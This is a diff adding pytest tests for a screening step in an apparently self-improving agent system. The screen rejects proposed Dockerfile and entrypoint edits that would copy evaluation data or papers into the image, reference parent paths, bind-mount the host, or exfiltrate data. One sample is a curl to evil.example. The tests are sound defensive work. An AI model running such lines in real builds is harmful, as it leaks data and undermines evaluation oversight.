@@ -109,6 +109,89 @@ class TestScreen:
         assert result.rejected == []
 
 
+def _dockerfile_proposal(content: str) -> Proposal:
+    return Proposal(
+        new_problem_name="image size too large",
+        target_module="dockerfile",
+        what="ベースイメージをスリム化する",
+        new_content=content,
+        predicted=["t1"],
+    )
+
+
+class TestTableIIIScreenRules:
+    """デプロイ境界(Dockerfile)と足場モジュールの安全規則(論文B Table III)。
+
+    検証観点:
+    - 評価データ・論文(data/ papers/)をイメージへ持ち込む COPY/ADD を拒否
+    - 親ディレクトリ参照(..)の COPY/ADD を拒否
+    - ホストパスのバインドマウント(--mount)を拒否
+    - 外部へのデータ持ち出し疑いのある RUN を拒否
+    - entrypoint から run_task 契約の消失を拒否
+    - local実行系では足場モジュール編集を検証不能のため拒否
+    - 正当な Dockerfile 編集は通す
+    """
+
+    def test_reject_copy_eval_data(self, selector: Selector) -> None:
+        p = _dockerfile_proposal("FROM python:3.12-slim\nCOPY data/ /app/data/\n")
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("COPY/ADD" in r.reason or "評価データ" in r.reason for r in result.rejected)
+
+    def test_reject_copy_papers(self, selector: Selector) -> None:
+        p = _dockerfile_proposal("FROM python:3.12-slim\nADD papers /app/papers\n")
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+
+    def test_reject_parent_path_copy(self, selector: Selector) -> None:
+        p = _dockerfile_proposal("FROM python:3.12-slim\nCOPY .. /app/all\n")
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("親" in r.reason for r in result.rejected)
+
+    def test_reject_host_mount(self, selector: Selector) -> None:
+        p = _dockerfile_proposal("FROM python:3.12-slim\nRUN --mount=type=bind,source=/host echo hi\n")
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("マウント" in r.reason for r in result.rejected)
+
+    def test_reject_exfiltration_run(self, selector: Selector) -> None:
+        p = _dockerfile_proposal("FROM python:3.12-slim\nRUN curl https://evil.example/leak\n")
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("持ち出し" in r.reason for r in result.rejected)
+
+    def test_reject_entrypoint_without_run_task(self, selector: Selector) -> None:
+        p = Proposal(
+            new_problem_name="X",
+            target_module="entrypoint",
+            what="エントポイントを整理",
+            new_content="def other(x):\n    return x\n",
+            predicted=["t1"],
+        )
+        result = selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("run_task" in r.reason for r in result.rejected)
+
+    def test_scaffold_module_rejected_in_local_executor(self) -> None:
+        """local実行系(既定)では足場編集をビルド・スモーク検証できないため拒否。"""
+        local_selector = Selector(
+            model=build_model("selector", "mock"), diff_line_budget=10, executor="local"
+        )
+        p = _dockerfile_proposal("FROM python:3.13-slim\n")
+        result = local_selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p not in result.accepted
+        assert any("docker実行系" in r.reason for r in result.rejected)
+
+    def test_scaffold_module_passes_in_docker_executor(self) -> None:
+        docker_selector = Selector(
+            model=build_model("selector", "mock"), diff_line_budget=10, executor="docker"
+        )
+        p = _dockerfile_proposal("FROM python:3.13-slim\n")
+        result = docker_selector.screen([p], sim_record=SimRecord(), task_ids=["t1"])
+        assert p in result.accepted
+
+
 class TestSelect:
     def test_accept_best_improvement(self, selector: Selector) -> None:
         from selfim.schemas import CandidateEvaluation, GateResult
